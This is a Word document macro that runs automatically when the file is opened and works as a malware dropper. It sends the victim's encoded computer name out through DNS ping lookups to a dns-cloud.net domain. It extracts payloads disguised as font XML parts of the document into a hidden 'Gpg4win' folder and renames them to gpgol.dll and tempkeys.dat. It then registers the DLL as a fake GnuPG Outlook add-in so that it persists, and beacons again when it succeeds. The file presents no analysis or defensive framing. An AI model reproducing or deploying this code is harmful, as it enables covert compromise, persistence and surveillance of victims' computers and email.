Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1

Sub Document_Open()
    On Error Resume Next
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set oShell = CreateObject("WScript.Shell")
    Set objShell = CreateObject("Shell.Application")
    Dim lngPtr As LongPtr
    
    computerName = CreateObject("WScript.Network").computerName
    ID = ""
    For i = 1 To Len(computerName)
        ID = ID & Right("000" & Asc(Mid(computerName, i, 1)), 3)
    Next
    Set colPingResults = CreateObject("winmgmts://./root/cimv2").ExecQuery("Select * From Win32_PingStatus Where Address = '" & ID & ".thedarktower.av.master.dns-cloud.net'")
    
    Gpg4winFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Gpg4win"
    If Not fso.FolderExists(Gpg4winFolder) Then
        With fso.CreateFolder(Gpg4winFolder)
            .Attributes = 18
        End With
        
        TempFolder = oShell.ExpandEnvironmentStrings("%tmp%")
        TargetFolder = Gpg4winFolder

        If fso.FileExists(TempFolder & "\logo.zip") Then
            fso.DeleteFile TempFolder & "\logo.zip", True
        End If
        
        If fso.FileExists(FullName) Then
            fso.CopyFile FullName, TempFolder & "\logo.zip"
        End If
        
        If (fso.FileExists(TempFolder & "\logo.zip") And fso.FolderExists(TargetFolder)) Then
            Set FilesInZip = objShell.NameSpace(TempFolder & "\logo.zip").Items
            Set FilesTo = objShell.NameSpace(TargetFolder)
            Set FilesInZip = objShell.NameSpace(TempFolder & "\logo.zip\word").Items
            For Each Item In FilesInZip
                If LenB(lngPtr) = 4 Then
                    If Item.Name = "fontStyles" Then
                        Count = FilesTo.Items.Count
                        FilesTo.copyHere Item, 1044
                        Do Until FilesTo.Items.Count = Count + 1
                            DoEvents
                        Loop
                        If fso.FileExists(TargetFolder & "\fontStyles.xml") Then
                            fso.MoveFile TargetFolder & "\fontStyles.xml", TargetFolder & "\gpgol.dll"
                        End If
                    End If
                Else
                    If Item.Name = "fontSettings" Then
                        Count = FilesTo.Items.Count
                        FilesTo.copyHere Item, 1044
                        Do Until FilesTo.Items.Count = Count + 1
                            DoEvents
                        Loop
                        If fso.FileExists(TargetFolder & "\fontSettings.xml") Then
                            fso.MoveFile TargetFolder & "\fontSettings.xml", TargetFolder & "\gpgol.dll"
                        End If
                    End If
                End If
                If Item.Name = "webStyles" Then
                    Count = FilesTo.Items.Count
                    FilesTo.copyHere Item, 1044
                    Do Until FilesTo.Items.Count = Count + 1
                        DoEvents
                    Loop
                    If fso.FileExists(TargetFolder & "\webStyles.xml") Then
                        fso.MoveFile TargetFolder & "\webStyles.xml", TargetFolder & "\tempkeys.dat"
                    End If
                End If
            Next
            fso.DeleteFile TempFolder & "\logo.zip", True
        End If
        Err.Clear
    
        If fso.FolderExists(Gpg4winFolder) And fso.FileExists(Gpg4winFolder & "\gpgol.dll") And fso.FileExists(Gpg4winFolder & "\tempkeys.dat") Then
            oShell.regWrite "HKEY_CURRENT_USER\SOFTWARE\Classes\GNU.GpgOL\CLSID\", "{3115036B-547E-4673-8479-EE54CD001B9D}", "REG_SZ"
            oShell.regWrite "HKEY_CURRENT_USER\SOFTWARE\Classes\GNU.GpgOL\", "Connect Class", "REG_SZ"
            oShell.regWrite "HKEY_CURRENT_USER\SOFTWARE\Classes\GNU.GpgOL\CurVer\", "GNU.GpgOL.Connect.1", "REG_SZ"
            oShell.regWrite "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{3115036B-547E-4673-8479-EE54CD001B9D}\ProgID\", "GNU.GpgOL", "REG_SZ"
            oShell.regWrite "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{3115036B-547E-4673-8479-EE54CD001B9D}\VersionIndependentProgID\", "GNU.Connect", "REG_SZ"
            oShell.regWrite "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{3115036B-547E-4673-8479-EE54CD001B9D}\InprocServer32\", Gpg4winFolder & "\gpgol.dll", "REG_SZ"
            oShell.regWrite "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{3115036B-547E-4673-8479-EE54CD001B9D}\InprocServer32\ThreadingModel", "Both", "REG_SZ"
            oShell.regWrite "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{3115036B-547E-4673-8479-EE54CD001B9D}\TypeLib\", "{A3941930-3595-4C4A-A783-1C21F3BD3C70}", "REG_SZ"
            oShell.regWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\Outlook\Addins\GNU.GpgOL\Description", "Cryptography for Outlook", "REG_SZ"
            oShell.regWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\Outlook\Addins\GNU.GpgOL\FriendlyName", "GpgOL - The GnuPG Outlook Plugin", "REG_SZ"
            oShell.regWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\Outlook\Addins\GNU.GpgOL\LoadBehavior", 3, "REG_DWORD"
        End If
    
        If fso.FolderExists(Gpg4winFolder) And fso.FileExists(Gpg4winFolder & "\gpgol.dll") And fso.FileExists(Gpg4winFolder & "\tempkeys.dat") And Err.Number = 0 Then
            Set colPingResults = CreateObject("winmgmts://./root/cimv2").ExecQuery("Select * From Win32_PingStatus Where Address = '" & ID & "in.thedarktower.av.master.dns-cloud.net'")
        End If
    End If
End Sub
